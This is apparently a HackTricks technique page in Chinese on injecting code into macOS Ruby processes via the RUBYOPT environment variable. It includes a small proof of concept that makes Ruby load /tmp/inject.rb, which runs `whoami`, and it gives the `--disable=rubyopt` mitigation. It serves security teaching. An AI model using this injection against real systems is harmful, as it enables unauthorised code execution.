# macOS Ruby Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Ruby 在运行脚本前，会从 `RUBYOPT` 环境变量中解析受支持的命令行开关。尽管 Ruby 会拒绝其中的某些开关，但 `-I` 可以添加库搜索目录，`-r` 可以加载库。因此，启动 Ruby 时如果进程使用了攻击者可控的环境变量，就可能被诱使加载攻击者控制的 Ruby 代码。<sup>[[1]](#references)</sup>

创建 `/tmp/inject.rb`：
```ruby:inject.rb
puts `whoami`
```
创建一个无害的 Ruby script，例如 `hello.rb`：
```ruby:hello.rb
puts 'Hello, World!'
```
使用受控的 `RUBYOPT` 值运行它：
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
要禁用此行为，请在脚本名称**之前**传递 `--disable=rubyopt`（或 `--disable-rubyopt`）：<sup>[[1]](#references)</sup>
```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```
写在 `hello.rb` 后的选项会通过 `ARGV` 传递给脚本；它不会禁用 Ruby 对 `RUBYOPT` 的预先处理。<sup>[[1]](#references)</sup>

## References

- [1] [Ruby 文档 - Ruby 命令行选项](https://ruby-doc.org/3.4/ruby/options_md.html)
{{#include ../../../banners/hacktricks-training.md}}
